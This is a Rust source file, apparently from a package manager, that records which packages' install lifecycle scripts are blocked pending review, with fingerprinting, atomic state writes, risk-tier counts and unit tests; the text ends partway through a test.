//! Phase 32 Phase 4 — `<project_dir>/.lpm/build-state.json` persistence layer.
//!
//! This file is the spine of the `lpm approve-builds` review flow. It captures
//! the install-time blocked set (packages with lifecycle scripts that aren't
//! covered by an existing strict approval) so:
//!
//! 1. The post-install warning ("8 packages blocked") only fires when the
//!    blocked set has CHANGED since the last install — repeated installs of
//!    the same project don't re-warn.
//! 2. `lpm approve-builds` doesn't have to re-walk the store on startup —
//!    it reads from this file directly.
//!
//! ## Location
//!
//! `<project_dir>/.lpm/build-state.json` (NOT `node_modules/.lpm/build-state.json`).
//! See **F7** in the Phase 4 status doc for the rationale: `.lpm/` next to
//! `package.json` survives `rm -rf node_modules`, matches the existing
//! `install-hash` convention, and avoids colliding with the linker's
//! pnpm-style internal store at `node_modules/.lpm/`.
//!
//! ## Schema versioning
//!
//! [`BUILD_STATE_VERSION`] is bumped on every breaking change. The reader
//! returns `None` for unknown versions (forward-compat: never read state
//! files newer than what we know how to parse).
//!
//! ## Atomic writes
//!
//! [`write_build_state`] writes to a tempfile alongside the target and
//! renames it into place. A crash mid-write leaves the previous state file
//! intact rather than producing a half-written file the reader chokes on.

use lpm_common::LpmError;
use lpm_security::{
    SecurityPolicy, TrustMatch, script_hash::compute_script_hash, triage::StaticTier,
};
use lpm_store::PackageStore;
use lpm_workspace::ProvenanceSnapshot;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};

/// Schema version for [`BuildState`].
///
/// **Bump policy:** only on **breaking** changes (field type change,
/// field removal, semantic change of an existing field). Adding new
/// `Option<T>` fields with `#[serde(default)]` is NON-breaking and does
/// NOT warrant a bump — serde silently drops unknown fields on read
/// (the struct is not `deny_unknown_fields`) and missing fields default
/// to `None`. This gives mutual compatibility between readers of
/// different ages without invalidating every existing
/// `.lpm/build-state.json` in the wild.
///
/// **Phase 46** adds several `Option<T>` fields to [`BlockedPackage`]
/// (static tier, provenance snapshot, publish timestamp, behavioral-tags
/// hash) without bumping this constant. See the plan §6 for the
/// rationale.
///
/// Reader policy (see [`read_build_state`]): accept anything
/// `<= BUILD_STATE_VERSION`; refuse newer versions (forward-incompatible
/// bumps signal a meaningful schema change that older readers can't
/// interpret safely).
pub const BUILD_STATE_VERSION: u32 = 1;

/// Filename inside `<project_dir>/.lpm/`.
pub const BUILD_STATE_FILENAME: &str = "build-state.json";

/// Top-level shape of `build-state.json`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildState {
    /// Bumped on every breaking change to this struct or to
    /// [`BlockedPackage`]. Readers compare against [`BUILD_STATE_VERSION`]
    /// and treat any mismatch as "no state, re-emit warning".
    pub state_version: u32,
    /// Deterministic SHA-256 over the sorted blocked-package list.
    /// Used by the install pipeline to decide whether to suppress the
    /// "N packages blocked" banner — it suppresses iff the fingerprint
    /// matches the previous run.
    pub blocked_set_fingerprint: String,
    /// RFC 3339 timestamp of when this state file was written. Used by
    /// future stale-state detection (Phase 12+) but not by Phase 4's
    /// suppression logic, which is purely fingerprint-based.
    pub captured_at: String,
    /// The packages whose lifecycle scripts were blocked at the time of
    /// the install that wrote this file. Sorted by `(name, version)` for
    /// deterministic fingerprinting.
    pub blocked_packages: Vec<BlockedPackage>,
}

/// One entry in [`BuildState::blocked_packages`].
///
/// Phase 46 adds the `static_tier`, `provenance_at_capture`,
/// `published_at`, and `behavioral_tags_hash` fields as
/// `Option<T>` with `skip_serializing_if = "Option::is_none"`. This
/// extension is backward-compatible with v1-written state (defaults to
/// `None`) and forward-compatible with pre-46 readers (serde drops
/// unknown fields; no `deny_unknown_fields` on this struct). See the
/// `BUILD_STATE_VERSION` policy comment for the no-version-bump
/// rationale.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BlockedPackage {
    pub name: String,
    pub version: String,
    /// SRI integrity hash from the lockfile, if known. Phase 4 binds
    /// approvals to this so a registry-side tarball swap re-opens review.
    pub integrity: Option<String>,
    /// Deterministic install-script hash from
    /// `lpm_security::script_hash::compute_script_hash`. Phase 4 binds
    /// approvals to this so any change to the executed script bytes
    /// re-opens review. May be `None` for packages whose store directory
    /// is missing or unreadable at install time (the gate fails closed —
    /// such packages stay blocked until the next install repopulates).
    pub script_hash: Option<String>,
    /// Which install phases (subset of [`lpm_security::EXECUTED_INSTALL_PHASES`])
    /// have non-empty bodies. Used by `lpm approve-builds` for human display.
    pub phases_present: Vec<String>,
    /// True if there IS an existing rich entry in `trustedDependencies`
    /// for this `name@version` but the stored binding doesn't match the
    /// current `(integrity, script_hash)`. Distinguishes "first-time
    /// blocked" from "previously approved, now drifted, needs re-review".
    pub binding_drift: bool,

    // ─── Phase 46 additions (all optional; see struct doc) ─────────
    /// Static-gate classification from Phase 46 Layer 1 (P2). `None`
    /// in P1-only state (the field exists but the classifier is not
    /// wired yet) and for packages captured with `script-policy =
    /// "deny" | "allow"` where classification is not applied.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub static_tier: Option<StaticTier>,
    /// Publisher-identity snapshot at capture time. Populated by P4
    /// (provenance drift). `None` in P1/P2/P3 state, and for packages
    /// whose registry response contains no attestation bundle.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provenance_at_capture: Option<ProvenanceSnapshot>,
    /// RFC 3339 publish timestamp as returned by the registry's
    /// metadata `time` map for this version. Populated by P1 from the
    /// TTL-cached metadata the install pipeline already fetches for
    /// the cooldown check. `None` for offline installs or packages
    /// whose metadata response omitted the timestamp.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub published_at: Option<String>,
    /// SHA-256 of the sorted set of behavioral tags that were `true`
    /// on this version's server-computed analysis. Populated by P1
    /// from the metadata the install pipeline already parses. Used by
    /// P7's version-diff UI to surface "behavioral tags changed since
    /// last approval" without re-fetching metadata. `None` for
    /// packages without server-side behavioral analysis.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub behavioral_tags_hash: Option<String>,
}

/// Result of [`capture_blocked_set_after_install`] — exposes the new state
/// AND whether the install pipeline should emit the post-install warning.
#[derive(Debug, Clone)]
pub struct BlockedSetCapture {
    /// The fresh `BuildState` that was just persisted.
    pub state: BuildState,
    /// Fingerprint from the previous install, if a state file existed.
    /// `None` means "no previous state" (first install, or state was
    /// deleted, or version mismatch).
    pub previous_fingerprint: Option<String>,
    /// Whether the install pipeline should emit a banner. The rule:
    /// - First install ever (no previous state): true if blocked_packages non-empty
    /// - Fingerprint changed (anything different): true
    /// - All previously blocked are now approved (current empty, prev non-empty): true (positive banner)
    /// - Fingerprint unchanged: false
    /// - First install ever AND no blocked packages: false
    pub should_emit_warning: bool,
    /// True iff the warning is the "all approved!" celebration. Lets the
    /// caller render a different message than the default "N blocked".
    pub all_clear_banner: bool,
}

/// Read the build-state file from `<project_dir>/.lpm/build-state.json`.
///
/// Returns `None` if:
/// - The file is missing
/// - The file fails to parse as JSON
/// - The file's `state_version` is **newer** than this binary supports
///
/// Older `state_version` values are accepted: the struct's new optional
/// fields default to `None` via their `#[serde(default)]` attribute,
/// producing a valid [`BuildState`] with degraded but usable content.
/// This is the forward-compat side of the no-version-bump policy
/// documented on [`BUILD_STATE_VERSION`]; the backward-compat side is
/// that absence of `deny_unknown_fields` lets older readers silently
/// drop fields written by newer writers.
///
/// All three failure modes are treated identically by callers: "no
/// previous state". The caller will write a fresh state on the next
/// install.
pub fn read_build_state(project_dir: &Path) -> Option<BuildState> {
    let path = build_state_path(project_dir);
    let content = std::fs::read_to_string(&path).ok()?;
    let state: BuildState = serde_json::from_str(&content).ok()?;
    if state.state_version > BUILD_STATE_VERSION {
        // Newer file written by a future LPM binary. We can't safely
        // interpret its semantics, so treat as missing and let the
        // current run write a fresh state. (Next time the newer LPM
        // runs, it will overwrite with a newer-version file again.)
        tracing::debug!(
            "build-state.json is newer than this binary supports \
             (got v{}, max v{}) — treating as missing",
            state.state_version,
            BUILD_STATE_VERSION,
        );
        return None;
    }
    Some(state)
}

/// Atomically write `state` to `<project_dir>/.lpm/build-state.json`.
///
/// Writes to a tempfile alongside the target then renames it into place.
/// A crash between the write and the rename leaves the previous state file
/// intact rather than corrupting it.
pub fn write_build_state(project_dir: &Path, state: &BuildState) -> Result<(), LpmError> {
    let lpm_dir = project_dir.join(".lpm");
    std::fs::create_dir_all(&lpm_dir).map_err(LpmError::Io)?;

    let target = build_state_path(project_dir);
    // Use a unique tempfile name (PID + nanos) so concurrent installs of
    // the same project don't clobber each other's tempfiles. The rename
    // is still the consistency boundary — last writer wins.
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp = lpm_dir.join(format!(".{BUILD_STATE_FILENAME}.{pid}.{nanos}.tmp"));

    let json = serde_json::to_string_pretty(state)
        .map_err(|e| LpmError::Registry(format!("failed to serialize build state: {e}")))?;
    std::fs::write(&tmp, format!("{json}\n")).map_err(LpmError::Io)?;
    std::fs::rename(&tmp, &target).map_err(|e| {
        // Best-effort cleanup of the tempfile if the rename failed.
        let _ = std::fs::remove_file(&tmp);
        LpmError::Io(std::io::Error::new(
            e.kind(),
            format!(
                "failed to rename build-state tempfile into place: {e} \
                 (target: {})",
                target.display()
            ),
        ))
    })?;
    Ok(())
}

/// Compute the deterministic fingerprint over a slice of blocked packages.
///
/// **Determinism contract:** the fingerprint MUST be stable across:
/// - Reorders of the input slice (sorted internally before hashing)
/// - Different operating systems
/// - Different versions of `serde_json` (we don't serialize through it)
///
/// The hash input format is one line per package, NUL-terminated:
///   `<name>@<version>|<integrity-or-empty>|<script_hash-or-empty>\x00`
/// sorted by `(name, version)` ascending. The output is `sha256-<hex>`
/// to match the script_hash format.
pub fn compute_blocked_set_fingerprint(packages: &[BlockedPackage]) -> String {
    let mut keys: Vec<String> = packages
        .iter()
        .map(|p| {
            format!(
                "{}@{}|{}|{}",
                p.name,
                p.version,
                p.integrity.as_deref().unwrap_or(""),
                p.script_hash.as_deref().unwrap_or(""),
            )
        })
        .collect();
    keys.sort();

    let mut hasher = Sha256::new();
    for key in keys {
        hasher.update(key.as_bytes());
        hasher.update([0u8]);
    }
    format!("sha256-{}", hex_lower(&hasher.finalize()))
}

/// Per-package metadata (Phase 46 P1) that enriches the captured
/// blocked-set beyond what's derivable from the store alone.
///
/// The install pipeline already fetches registry metadata during the
/// cooldown check for every resolved package; Phase 46 extends that
/// fetch to also forward `publishedAt` and a hash of the package's
/// server-computed behavioral tags into `BlockedPackage`. Both fields
/// are optional and missing entries degrade gracefully to `None` in
/// the output (offline installs, npm packages without server-side
/// behavioral analysis, lockfile fast-path without a metadata fetch
/// for that version — all work).
///
/// Keyed by `(name, version)` rather than a richer package identity
/// because the blocked-set capture operates on the `installed` tuple
/// list, not lockfile rows.
#[derive(Debug, Clone, Default)]
pub struct BlockedSetMetadata {
    pub by_pkg: std::collections::HashMap<(String, String), BlockedSetMetadataEntry>,
}

/// One entry in [`BlockedSetMetadata`].
#[derive(Debug, Clone, Default)]
pub struct BlockedSetMetadataEntry {
    /// RFC 3339 publish timestamp from the registry's `time` map for
    /// this version. `None` for offline, fast-path without a metadata
    /// fetch, or packages whose registry response omits the timestamp.
    pub published_at: Option<String>,
    /// SHA-256 over the sorted set of `true` behavioral-analysis tags
    /// (see `lpm_security::triage::hash_behavioral_tag_set`). `None`
    /// for packages without server-side behavioral analysis.
    pub behavioral_tags_hash: Option<String>,
    /// **Phase 46 P4 Chunk 3.** Provenance snapshot captured at
    /// install time from the registry's `dist.attestations` pointer
    /// (via `crate::provenance_fetch::fetch_provenance_snapshot`).
    /// Forwarded into [`BlockedPackage::provenance_at_capture`] by
    /// [`compute_blocked_packages_with_metadata`] so
    /// `lpm approve-builds` can propagate it to the binding's
    /// `provenance_at_approval` on approval — closing the P4
    /// write-path loop.
    ///
    /// `None` for:
    /// - Offline installs (fetcher degraded to `Ok(None)`).
    /// - Packages whose registry omits `dist.attestations` AND the
    ///   install pipeline skipped the per-package fetch (e.g., no
    ///   prior approval reference for this name — no point checking
    ///   drift). The fetcher itself returns
    ///   `Some(ProvenanceSnapshot { present: false, .. })` when the
    ///   registry explicitly has no attestation; that's distinct
    ///   from the install pipeline choosing to skip the fetch
    ///   entirely.
    pub provenance_at_capture: Option<lpm_workspace::ProvenanceSnapshot>,
}

impl BlockedSetMetadata {
    /// Lookup for `(name, version)`. Returns a reference to the entry
    /// or `None` if the caller didn't provide metadata for this
    /// package (graceful degradation — the captured fields just stay
    /// `None`).
    pub fn get(&self, name: &str, version: &str) -> Option<&BlockedSetMetadataEntry> {
        self.by_pkg.get(&(name.to_string(), version.to_string()))
    }

    /// Insert / overwrite metadata for `(name, version)`.
    pub fn insert(&mut self, name: String, version: String, entry: BlockedSetMetadataEntry) {
        self.by_pkg.insert((name, version), entry);
    }
}

/// Compute the install-time blocked set for a project.
///
/// Walks `installed`, looks at each package's lifecycle scripts via the
/// store, and includes any package whose script hash is NOT covered by
/// an existing strict approval in `policy.trusted_dependencies`.
///
/// Returns the list sorted by `(name, version)` so the caller can pass
/// it directly to [`compute_blocked_set_fingerprint`].
///
/// This wrapper calls [`compute_blocked_packages_with_metadata`] with
/// an empty metadata map; the Phase-46 `published_at` and
/// `behavioral_tags_hash` fields on emitted `BlockedPackage` entries
/// stay `None`. The production install path calls
/// `compute_blocked_packages_with_metadata` directly with a populated
/// map; tests keep using this signature.
pub fn compute_blocked_packages(
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
) -> Vec<BlockedPackage> {
    compute_blocked_packages_with_metadata(store, installed, policy, &BlockedSetMetadata::default())
}

/// Phase 46 P1 metadata-aware variant of [`compute_blocked_packages`].
///
/// Same logic but forwards per-package `published_at` and
/// `behavioral_tags_hash` from `metadata` into each emitted
/// [`BlockedPackage`]. The fingerprint is unaffected (intentionally —
/// it's a stability metric over *blockable* packages, not over their
/// metadata).
pub fn compute_blocked_packages_with_metadata(
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
) -> Vec<BlockedPackage> {
    let mut blocked: Vec<BlockedPackage> = Vec::new();

    for (name, version, integrity) in installed {
        let pkg_dir = store.package_dir(name, version);

        // Compute the script hash. None means "no install-phase scripts" —
        // such a package is not blockable, skip.
        let script_hash = match compute_script_hash(&pkg_dir) {
            Some(h) => h,
            None => continue,
        };

        // What phases are present (for human display in
        // approve-builds) AND their bodies (for the Phase 46 P2
        // static-gate classifier below)? One read/parse of
        // package.json feeds both.
        let phase_bodies = read_install_phase_bodies(&pkg_dir);
        if phase_bodies.is_empty() {
            // Defensive: compute_script_hash returned Some but we found no
            // phases. Shouldn't happen given F3, but skip rather than emit
            // a confusing entry.
            continue;
        }
        let phases_present: Vec<String> =
            phase_bodies.iter().map(|(name, _)| name.clone()).collect();

        // Phase 46 P2: classify each present phase and aggregate
        // worst-wins. Populated unconditionally (not gated on
        // `script-policy`) per plan §5.1 — the annotation is
        // user-visible UX in all three modes.
        let static_tier: Option<lpm_security::triage::StaticTier> = phase_bodies
            .iter()
            .map(|(_, body)| lpm_security::static_gate::classify(body))
            .reduce(lpm_security::triage::StaticTier::worse_of);

        // Strict gate query. Phase 4 binds approvals to
        // (name, version, integrity, script_hash).
        let trust =
            policy.can_run_scripts_strict(name, version, integrity.as_deref(), Some(&script_hash));

        let (is_blocked, binding_drift) = match trust {
            // Strict approval covers this exact tuple — NOT blocked.
            TrustMatch::Strict => (false, false),
            // Legacy bare-name entry covers it leniently — NOT blocked
            // (the existing build pipeline will run the script with a
            // deprecation warning per M5). The blocked set is for things
            // the user must REVIEW; legacy entries are reviewable via the
            // `lpm approve-builds` upgrade path but not blocking.
            TrustMatch::LegacyNameOnly => (false, false),
            // Rich entry exists but the binding doesn't match — BLOCKED
            // and flagged as drift so approve-builds can show a special
            // "previously approved, please re-review" message.
            TrustMatch::BindingDrift { .. } => (true, true),
            // No matching entry at all — BLOCKED, first-time review.
            TrustMatch::NotTrusted => (true, false),
        };

        if is_blocked {
            // Phase 46 P1 metadata forwarding. The caller (install.rs)
            // populates `metadata` from the same registry responses
            // the cooldown check already fetched, so this is a
            // memory-only hash-map lookup per package.
            let entry = metadata.get(name, version);
            blocked.push(BlockedPackage {
                name: name.clone(),
                version: version.clone(),
                integrity: integrity.clone(),
                script_hash: Some(script_hash),
                phases_present,
                binding_drift,
                // Phase 46 P2 populates `static_tier` from the
                // worst-wins reduction above.
                static_tier,
                // Phase 46 P4 Chunk 3: forwarded from the install
                // pipeline's per-package provenance fetch. Populated
                // for EVERY blocked package that went through the
                // drift gate, not just those whose drift fired —
                // fixes the reviewer-flagged "hardcoded None"
                // underfill and closes the approve-builds
                // write-path (binding.provenance_at_approval is
                // written from this value on approval).
                provenance_at_capture: entry.and_then(|e| e.provenance_at_capture.clone()),
                published_at: entry.and_then(|e| e.published_at.clone()),
                behavioral_tags_hash: entry.and_then(|e| e.behavioral_tags_hash.clone()),
            });
        }
    }

    // Sort for deterministic fingerprinting.
    blocked.sort_by(|a, b| (&a.name, &a.version).cmp(&(&b.name, &b.version)));
    blocked
}

/// The end-to-end install hook: compute → compare to previous → write →
/// return whether to emit a banner.
///
/// Thin wrapper over [`capture_blocked_set_after_install_with_metadata`]
/// that supplies an empty metadata map. Production callers use the
/// with-metadata variant; test callers use this signature.
pub fn capture_blocked_set_after_install(
    project_dir: &Path,
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
) -> Result<BlockedSetCapture, LpmError> {
    capture_blocked_set_after_install_with_metadata(
        project_dir,
        store,
        installed,
        policy,
        &BlockedSetMetadata::default(),
    )
}

/// Phase 46 P1 metadata-aware variant of
/// [`capture_blocked_set_after_install`]. Used by the install pipeline
/// where per-package metadata is available; see [`BlockedSetMetadata`].
pub fn capture_blocked_set_after_install_with_metadata(
    project_dir: &Path,
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
) -> Result<BlockedSetCapture, LpmError> {
    let blocked = compute_blocked_packages_with_metadata(store, installed, policy, metadata);
    let fingerprint = compute_blocked_set_fingerprint(&blocked);

    let previous = read_build_state(project_dir);
    let previous_fingerprint = previous.as_ref().map(|p| p.blocked_set_fingerprint.clone());
    let previous_was_non_empty = previous
        .as_ref()
        .map(|p| !p.blocked_packages.is_empty())
        .unwrap_or(false);

    let fingerprint_changed = previous_fingerprint
        .as_deref()
        .map(|prev| prev != fingerprint)
        .unwrap_or(true); // no previous state → "changed" from None

    let now_empty = blocked.is_empty();

    // Decide emission:
    let (should_emit_warning, all_clear_banner) = if fingerprint_changed {
        if now_empty && previous_was_non_empty {
            // Positive case: previously had blocked entries, all now approved.
            (true, true)
        } else if now_empty {
            // First install ever AND nothing to block. Silent.
            (false, false)
        } else {
            // First install with blocks, OR new package added, OR script
            // hash drifted. Loud.
            (true, false)
        }
    } else {
        // Fingerprint unchanged: silent regardless of count.
        (false, false)
    };

    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: fingerprint,
        captured_at: current_rfc3339(),
        blocked_packages: blocked,
    };

    write_build_state(project_dir, &state)?;

    Ok(BlockedSetCapture {
        state,
        previous_fingerprint,
        should_emit_warning,
        all_clear_banner,
    })
}

/// Path helper. Centralized so any future relocation only changes one site.
pub fn build_state_path(project_dir: &Path) -> PathBuf {
    project_dir.join(".lpm").join(BUILD_STATE_FILENAME)
}

/// Read the package.json from `<store>/<safe_name>@<version>/` and
/// return the `(phase_name, body)` pairs for each entry in
/// [`lpm_security::EXECUTED_INSTALL_PHASES`] that is present and has
/// a non-empty body.
///
/// Replaces the earlier `read_present_install_phases` (names-only)
/// variant. The one caller — [`compute_blocked_packages_with_metadata`]
/// — needs the bodies in P2 to run the Phase 46 static-gate classifier
/// alongside the existing `phases_present` derivation, and folding the
/// two into one pass over the JSON avoids reading / re-parsing
/// `package.json` twice per blocked candidate.
///
/// Returns an empty vec on any of:
/// - missing `package.json` (store miss — the gate already fails
///   closed elsewhere),
/// - malformed JSON,
/// - missing or non-object `scripts` field,
/// - no present install phases with non-empty bodies.
///
/// Output order matches [`lpm_security::EXECUTED_INSTALL_PHASES`]
/// (`preinstall`, `install`, `postinstall`), NOT the order of keys in
/// the source JSON — matching the script-hash invariant so downstream
/// aggregation is stable across re-serializations of `package.json`.
fn read_install_phase_bodies(pkg_dir: &Path) -> Vec<(String, String)> {
    let pkg_json_path = pkg_dir.join("package.json");
    let Ok(content) = std::fs::read_to_string(&pkg_json_path) else {
        return vec![];
    };
    let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&content) else {
        return vec![];
    };
    let Some(scripts) = parsed.get("scripts").and_then(|v| v.as_object()) else {
        return vec![];
    };

    lpm_security::EXECUTED_INSTALL_PHASES
        .iter()
        .filter_map(|phase| {
            scripts
                .get(*phase)
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty())
                .map(|s| ((*phase).to_string(), s.to_string()))
        })
        .collect()
}

/// Phase 46 P2 Chunk 5 — per-tier counts for a blocked set.
///
/// Returns `(green, amber, red)` with these accounting rules:
/// - `Some(Green)` → green.
/// - `Some(Red)` → red.
/// - `Some(Amber)` / `Some(AmberLlm)` / `None` → amber. The two
///   amber variants collapse because they're indistinguishable to
///   the user's "needs review" mental model — `AmberLlm` just means
///   an LLM weighed in (P8). `None` means persisted state predates
///   P2; conservative: count unknowns as amber so the user's eye is
///   drawn to them.
///
/// Exposed so a future `--json` install shape and the human
/// summary line share one counting function.
pub fn count_blocked_by_tier(blocked: &[BlockedPackage]) -> (usize, usize, usize) {
    use lpm_security::triage::StaticTier;
    let mut green = 0usize;
    let mut amber = 0usize;
    let mut red = 0usize;
    for bp in blocked {
        match bp.static_tier {
            Some(StaticTier::Green) => green += 1,
            Some(StaticTier::Red) => red += 1,
            Some(StaticTier::Amber | StaticTier::AmberLlm) | None => amber += 1,
        }
    }
    (green, amber, red)
}

/// Phase 46 P2 Chunk 5 — triage-mode install summary line.
///
/// Rendered ONLY when `script-policy = "triage"` is the effective
/// policy. Replaces the multi-line
/// [`crate::commands::build::show_install_build_hint`] output under
/// triage; `deny` / `allow` keep the existing hint untouched.
///
/// **Format (stable P2-onward; snapshot-tested):**
/// ```text
/// script-policy: triage (N green / M amber / K red → lpm approve-builds)
/// ```
///
/// Agents parsing the line can substring-match the stable anchor
/// `"script-policy: triage ("` and the suffix
/// `" → lpm approve-builds)"`. Counts are derived from
/// [`count_blocked_by_tier`] so any future JSON / machine-readable
/// output shares the same arithmetic.
pub fn format_triage_summary_line(blocked: &[BlockedPackage]) -> String {
    let (green, amber, red) = count_blocked_by_tier(blocked);
    format!(
        "script-policy: triage ({green} green / {amber} amber / {red} red → lpm approve-builds)"
    )
}

fn current_rfc3339() -> String {
    // Use `chrono` for the timestamp (already a workspace dep in lpm-cli;
    // lpm-security uses `time` but that's not depended on here).
    chrono::Utc::now().to_rfc3339()
}

fn hex_lower(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0f) as usize] as char);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use lpm_security::TrustedDependencies;
    use lpm_security::TrustedDependencyBinding;
    use std::collections::HashMap;
    use std::fs;
    use tempfile::tempdir;

    fn make_blocked(
        name: &str,
        version: &str,
        integrity: Option<&str>,
        script_hash: Option<&str>,
    ) -> BlockedPackage {
        BlockedPackage {
            name: name.to_string(),
            version: version.to_string(),
            integrity: integrity.map(String::from),
            script_hash: script_hash.map(String::from),
            phases_present: vec!["postinstall".to_string()],
            binding_drift: false,
            // Phase 46 fields — `None` by default in this helper so
            // pre-Phase-46 tests behave unchanged. Dedicated tests
            // below exercise the populated path.
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
        }
    }

    fn make_state(packages: Vec<BlockedPackage>) -> BuildState {
        let fingerprint = compute_blocked_set_fingerprint(&packages);
        BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: fingerprint,
            captured_at: "2026-04-11T00:00:00Z".to_string(),
            blocked_packages: packages,
        }
    }

    // ── BuildState round-trip ────────────────────────────────────────

    #[test]
    fn build_state_round_trips_through_serde() {
        let original = make_state(vec![
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ]);
        let json = serde_json::to_string_pretty(&original).unwrap();
        let parsed: BuildState = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.state_version, original.state_version);
        assert_eq!(
            parsed.blocked_set_fingerprint,
            original.blocked_set_fingerprint
        );
        assert_eq!(parsed.blocked_packages, original.blocked_packages);
    }

    #[test]
    fn build_state_version_field_is_present_and_versioned() {
        let state = make_state(vec![]);
        assert_eq!(state.state_version, BUILD_STATE_VERSION);
        // Const assert: schema version must be at least 1 (compile-time check)
        const _: () = assert!(BUILD_STATE_VERSION > 0);
    }

    // ── read_build_state ─────────────────────────────────────────────

    #[test]
    fn read_build_state_returns_none_when_file_missing() {
        let dir = tempdir().unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_none_when_file_corrupt() {
        let dir = tempdir().unwrap();
        fs::create_dir_all(dir.path().join(".lpm")).unwrap();
        fs::write(
            dir.path().join(".lpm").join(BUILD_STATE_FILENAME),
            "{not valid json",
        )
        .unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_none_when_state_version_mismatch() {
        let dir = tempdir().unwrap();
        let mut state = make_state(vec![make_blocked("x", "1.0.0", None, None)]);
        state.state_version = 9999; // forward-compat: never read newer
        fs::create_dir_all(dir.path().join(".lpm")).unwrap();
        fs::write(
            dir.path().join(".lpm").join(BUILD_STATE_FILENAME),
            serde_json::to_string(&state).unwrap(),
        )
        .unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_some_for_valid_file() {
        let dir = tempdir().unwrap();
        let original = make_state(vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some("sha256-y"),
        )]);
        write_build_state(dir.path(), &original).unwrap();
        let recovered = read_build_state(dir.path()).expect("must read back");
        assert_eq!(recovered.state_version, original.state_version);
        assert_eq!(recovered.blocked_packages.len(), 1);
    }

    // ── write_build_state ────────────────────────────────────────────

    #[test]
    fn write_build_state_creates_lpm_dir_if_missing() {
        let dir = tempdir().unwrap();
        // No .lpm/ exists yet
        assert!(!dir.path().join(".lpm").exists());
        write_build_state(dir.path(), &make_state(vec![])).unwrap();
        assert!(dir.path().join(".lpm").join(BUILD_STATE_FILENAME).exists());
    }

    #[test]
    fn write_build_state_atomic_write_via_temp_file_rename() {
        // Verify the temp file is gone after a successful write — i.e.,
        // the rename happened. We can't easily simulate a crash mid-write
        // in a unit test, but we CAN assert that the temp file artifact
        // isn't left behind on the happy path.
        let dir = tempdir().unwrap();
        write_build_state(dir.path(), &make_state(vec![])).unwrap();

        let lpm_dir = dir.path().join(".lpm");
        let entries: Vec<_> = std::fs::read_dir(&lpm_dir).unwrap().collect();
        // Only the final file should remain — no `.tmp` artifacts
        for entry in entries {
            let name = entry.unwrap().file_name();
            let name_str = name.to_string_lossy();
            assert!(!name_str.ends_with(".tmp"), "temp file leaked: {name_str}");
        }
    }

    #[test]
    fn write_then_read_round_trip_preserves_all_fields() {
        let dir = tempdir().unwrap();
        let original = make_state(vec![BlockedPackage {
            name: "esbuild".into(),
            version: "0.25.1".into(),
            integrity: Some("sha512-foo".into()),
            script_hash: Some("sha256-bar".into()),
            phases_present: vec!["preinstall".into(), "postinstall".into()],
            binding_drift: true,
            // Phase 46 fields: left None in this pre-Phase-46 roundtrip
            // test so the assertion stays byte-identical to Phase 4's
            // original shape.
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
        }]);
        write_build_state(dir.path(), &original).unwrap();
        let recovered = read_build_state(dir.path()).unwrap();
        assert_eq!(recovered.blocked_packages, original.blocked_packages);
    }

    // ── compute_blocked_set_fingerprint ──────────────────────────────

    #[test]
    fn compute_blocked_set_fingerprint_is_deterministic_across_input_order() {
        let a = vec![
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ];
        let b = vec![
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
        ];
        assert_eq!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
            "fingerprint must be invariant under input reorder"
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_name_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![make_blocked("sharp", "0.25.1", None, Some("sha256-x"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_version_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![make_blocked("esbuild", "0.25.2", None, Some("sha256-x"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_script_hash_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-old"))];
